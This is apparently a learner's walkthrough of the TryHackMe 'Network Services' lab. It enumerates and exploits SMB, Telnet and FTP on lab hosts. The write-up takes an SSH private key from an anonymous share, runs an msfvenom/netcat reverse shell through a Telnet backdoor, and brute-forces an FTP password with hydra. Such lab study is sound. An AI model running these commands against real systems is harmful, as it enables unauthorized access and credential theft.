# Network Services
+ Description: Learn about, then enumerate and exploit a variety of network services and misconfigurations.
+ Link: https://tryhackme.com/r/room/networkservices
+ Type: Walkthrough
  
+ Target IP Address (SMB): 10.10.6.182
+ Target IP Address (Telnet): 10.10.112.119
+ AttackBox IP Address (Telnet): 10.10.198.128
+ Target IP Address (FTP): 10.10.148.36

## Tools
+ NMAP
+ enum4linux
+ smbclient
+ SSH
+ Telnet
+ MSFvenom
+ Netcat

## External Resources
N/A

## Task 01 | Get Connected
N/A

## Task 02 | Understanding SMB
+ SMB = Server Message Block
+ Client-server communication protocol used for sharing networked resources (i.e. files, printers, serial ports).
+ Response-request protocol, so it transmit messages between the client and server to establish a connection.
+ Once a connection is established, a client can send commands to the server for access to resources and essentially treats it as an extension of their own file system.

## Task 03 | Enumerating SMB
1. Recon: `nmap -sV 10.10.6.182`. The machine has 3 ports open and the following services: OpenSSH and Samba.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/01.png)
  
2. `enum4linux -a 10.10.6.182`. Found that the workgroup name is "WORKGROUP", the machine's name is "POLOSMB", the OS version is 6.1, and an share called "profiles".  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/02.png)
  
## Task 04 | Exploiting SMB
1. `smbclient //10.10.6.182/profiles` to see if the share allows anonymous acces. It does.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/03.png)
  
2. Looked around in the directory. Found that a person named John Cactus uses/owns this folder, they connect using SSH, and their authorization keys.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/04.png)
  
3. `get id_rsa` and `get id_rsa.pub` to download the files. `cat id_rsa.pub` to find a hint to John's login infomation "cactus@polosmb".
4. `ssh -i id_rsa cactus@10.10.6.182` to log into the machine using John's RSA private key.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/05.png)
  
5. Looked around in the directory, found a file called "smb.txt", downloaded it using `get smb.txt`, and read it using `cat smb.txt`. Found the flag.

## Task 05 | Understanding Telnet
+ Application protocol
+ Allows a user to connect to and execute commands on a remote machine that's running a Telnet server via a Telnet client.
+ Unencrypted
+ Mostly replaced by SSH.
+ Command Syntax: `telnet <ip> <port>`.

## Task 06 | Enumerating Telnet
1. Recon: `nmap -sV 10.10.112.119` revealed that 0 ports were open. So, I started a different scan `nmap -sV -p- 10.10.112.119 -T 5`, to look through all ports.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/06.png)
  
2. By looking through the returned information from the NMAP scan I found that port 8012/TCP is being used for a backdoor and is likely owned by a user named "SKIDY".

## Task 07 | Exploiting Telnet
1. `telnet 10.10.112.119 8012` and tried out some commands.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/07.png)
  
2. On the AttackBox `sudo tcpdump ip proto \\icmp -i ens5` and `.RUN ping 10.10.198.128 -c 1` on the Telnet session to see if I can execute system commands and reach the AttackBox.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/08.png)
  
3. On the AttackBox `msfvenom -p cmd/unix/reverse_netcat lhost=10.10.198.128 lport=4444 R` to create the reverse shell.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/09.png)
  
4. On the AttackBox `nc -lvp 4444` to listen on port 4444.
5. On the Telnet session `.RUN mkfifo /tmp/tmqkt; nc 10.10.198.128 4444 0</tmp/tmqkt | /bin/sh >/tmp/tmqkt 2>&1; rm /tmp/tmqkt`.
6. On the AttackBox in the Terminal with the listener, I executed `ls` and `cat flag.txt` to locate and display the flag.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/10.png)
  
## Task 08 | Understanding FTP
+ A protocol used to transfer files remotely over a network. 
+ Uses a client-server model; client initiates connection to the server, server validates the client's credentials, and then a session is opened.
+ Once a session is opened, the client can execute FTP commands on the server.
+ Operates using 2 channels: Command & Data.
+ The command channel transmits commands and replies to commands.
+ The data channel transmits data.
+ Channels are unencrypted.
+ A sever can support active and/or passive connections.
+ In an active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
+ In a passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 
+ By separating commands and data into separate channels, a user doesn't have to wait for the current data transfer to finished before executing more commands.
+ Default port = 21

## Task 09 | Enumerating FTP
1. Recon: `nmap -sV 10.10.148.36`. Revealed two ports open with the services: FTP and Apache.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/11.png)
  
2. Connected to the FTP server using `ftp 10.10.148.36` with name "anonymous" and no password. Found a file called "PUBLIC_NOTICE.txt".  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/12.png)
3. `get PUBLIC_NOTICE.txt` and `cat PUBLIC_NOTICE.txt` to see what's in the file. Found a possible username "Mike".

## Task 10 | Exploiting FTP
1. I first tried `hydra -t 4 -l Mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.148.36 ftp`, however it was getting taking a while. S,o I changed up the command (`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt 10.10.148.36 ftp`) and tried again.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/13.png)
  
2. Connected to the FTP server again using `ftp 10.10.148.36` this time with name "mike" and password "password". Found a file called "ftp.txt".  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/14.png)
  
3. `get ftp.txt` and `cat ftp.txt` to see what's in the file. Found the flag.

## Task 11 | Expanding Your Knowledge
+ https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
+ https://attack.mitre.org/techniques/T1210/
+ https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

## Learned
+ New Tools: MSFvenom.
+ I'm now more familiar/refreshed myself with SMB, Telnet, and FTP.
+ "id_rsa.pub" is useful because it's the default name of an SSH identity file.